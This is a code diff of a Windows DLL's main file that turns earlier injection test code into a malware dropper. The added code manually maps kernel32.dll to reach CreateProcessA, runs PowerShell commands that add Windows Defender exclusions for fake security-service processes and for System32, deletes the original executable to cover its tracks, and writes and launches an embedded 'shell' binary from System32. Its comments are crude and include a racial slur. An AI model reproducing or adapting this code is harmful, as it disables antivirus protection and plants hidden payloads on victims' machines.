@@ -1,85 +1,99 @@
 // dllmain.cpp : Definisce il punto di ingresso per l'applicazione DLL.
 #include "pch.h"
-#include <iostream>
-#include <Windows.h>
-#include "injection.h"
+#include "general.h"
+#include "embeds.h"
 
-#define STATUS_NOT_SUPPORTED             ((NTSTATUS)0xC00000BBL)
+BOOL IsElevated() {
+    BOOL fRet = FALSE;
+    HANDLE hToken = NULL;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        TOKEN_ELEVATION Elevation;
+        DWORD cbSize = sizeof(TOKEN_ELEVATION);
+        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
+            fRet = Elevation.TokenIsElevated;
+        }
+    }
+    if (hToken) {
+        CloseHandle(hToken);
+    }
+    return fRet;
+}
 
-#define JOIN(x, y) x ## y
-#ifdef _WIN64
-#define FULL_PATH(x) JOIN("C:\\Windows\\System32\\", x)
-#else
-#define FULL_PATH(x) JOIN("C:\\Windows\\SysWOW64\\", x)
-#endif
-
-const char szProc[] = "Lightcord.exe";
-
-using WriteConsole_t = BOOL(WINAPI*)(
-	_In_            HANDLE		hConsoleOutput,
-	_In_			const VOID*	lpBuffer,
-	_In_            DWORD		nNumberOfCharsToWrite,
-	_Out_opt_       LPDWORD		lpNumberOfCharsWritten,
-	_Reserved_      LPVOID		lpReserved
-	);
-
-using CreateThread_t = HANDLE(__stdcall*) (
-	_In_opt_					LPSECURITY_ATTRIBUTES   lpThreadAttributes,
-	_In_						SIZE_T                  dwStackSize,
-	_In_						LPTHREAD_START_ROUTINE  lpStartAddress,
-	_In_opt_  __drv_aliasesMem	LPVOID					lpParameter,
-	_In_						DWORD                   dwCreationFlags,
-	_Out_opt_					LPDWORD                 lpThreadId
-	);
-
-void loop();
-
+CHAR* ExePath() {
+    CHAR buffer[MAX_PATH] = { 0 };
+    GetModuleFileNameA(NULL, buffer, MAX_PATH);
+    return buffer;
+}
+std::string GetCWD() {
+    WCHAR buffer[MAX_PATH] = { 0 };
+    GetModuleFileNameW(NULL, buffer, MAX_PATH);
+    std::wstring ws(buffer);
+    std::string file_path(ws.begin(), ws.end());
+    std::wstring::size_type pos = file_path.find_last_of("\\/");
+    return file_path.substr(0, pos + 1);
+}
 void main() {
-	//Alloc console
-	AllocConsole();
-	FILE* f;
-	freopen_s(&f, "CONOUT$", "w", stdout);
+	//Alloc console for debug purposes
+	//AllocConsole();
+	//FILE* f;
+	//freopen_s(&f, "CONOUT$", "w", stdout);
+
+    //if (IsElevated()) {
+    //    printf("Im elevated");
+    //}
+    //else {
+    //    printf("Im a dumbass");
+    //    return;
+    //}
+    auto full_path = ExePath();
+
+    SetConsoleTitle(full_path);
 
 	HANDLE hProc = GetCurrentProcess();
 
-	if (!hProc) {
-		DWORD Err = GetLastError();
-		printf("OpenProcess failed: 0x%X\n", GetLastError());
-		system("PAUSE");
-		return ;
-	}
-
 	auto pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
-	printf("kernel32.dll mapped at: %X\n", pKernel);
-	auto pUser32 = ManualMap(hProc, FULL_PATH("user32.dll"));
-	printf("user32.dll mapped at: %X\n", pUser32);
-	auto pNtDll = ManualMap(hProc, FULL_PATH("ntdll.dll"));
-	printf("ntdll.dll mapped at: %X\n", pNtDll);
 
-	if (!pKernel || !pUser32 || !pNtDll) {
-		CloseHandle(hProc);
-		printf("Something went wrong...");
-		system("PAUSE");
-		return;
+	while (!pKernel) {
+		pKernel = ManualMap(hProc, FULL_PATH("kernel32.dll"));
 	}
+
+	//Uses manual mapped kernel32.dll to call CreateProcessA
+	Powershell powershell((CreateProcessA_t)ResolveFunctionPtr(pKernel, L"CreateProcessA"));
+	//Add exclusions for the Shell, Shell Manager and legitimate process (just to mess with anyone reversing this shit idk)   8================================================D
+	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthService.exe\"");
+	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthService32.exe\"");
+	powershell.ExecuteCommand("Add-MpPreference -ExclusionProcess \"SecurityHealthServiceManager.exe\"");
+	//Add exclusion for C:\Windows\System32, which is where the service will be located, also just to mess with anyone reversing this bad boy
+	powershell.ExecuteCommand("Add-MpPreference -ExclusionPath \"C:\\Windows\\System32\"");
+
+    while (FileExists(full_path)) { //If update.exe still exists, wait for it to be renamed
+        Sleep(100);
+    }
+
+    while (!remove((GetCWD() + "trash.tmp").c_str())) { //Remove the old executable as fast as possible to avoid sussy bakas looking around the folder :)
+        Sleep(100);
+    }
+
 	CloseHandle(hProc);
 
-	auto pWriteConsole = (WriteConsole_t)ResolveFunctionPtr(pKernel, L"WriteConsoleW");
-	std::cout << "Address of WriteConsole: " << pWriteConsole << std::endl;
-	pWriteConsole(GetStdHandle(STD_OUTPUT_HANDLE), L"HI\n", 3, nullptr, nullptr);
+    //Write the shell inside System modules folder, just because why not mess with them niggas
+    std::ofstream output;
+    output.open(FULL_PATH(SHELL_MODULE_NAME), std::ofstream::binary);
+    output.write((char*)embedded_image_1, embedded_image_1_size);
+    output.close();
 
-	auto pCreateThread = (CreateThread_t)ResolveFunctionPtr(pKernel, L"CreateThread");
-	std::cout << "Address of CreateThread: " << pCreateThread << std::endl;
-	pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)loop, nullptr, 0, NULL);
+    //Open the shell, which will then load the service
+    STARTUPINFO info = { sizeof(info) };
+    PROCESS_INFORMATION processInfo;
+    while (!CreateProcessA(FULL_PATH(SHELL_MODULE_NAME), (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
+    {
+        Sleep(100);
+    }
+    CloseHandle(processInfo.hProcess);
+    CloseHandle(processInfo.hThread);
 
+    //Wait for main executable to end execution otherwise it will fucking crash sometimes
 	Sleep(-1);
-}
-
-void loop() {
-	while (1) {
-		printf("Ayo, im in a loop\n");
-		Sleep(1000);
-	}
 }
 
 BOOL APIENTRY DllMain( HMODULE hModule,
@@ -99,4 +113,3 @@ BOOL APIENTRY DllMain( HMODULE hModule,
     }
     return TRUE;
 }
-
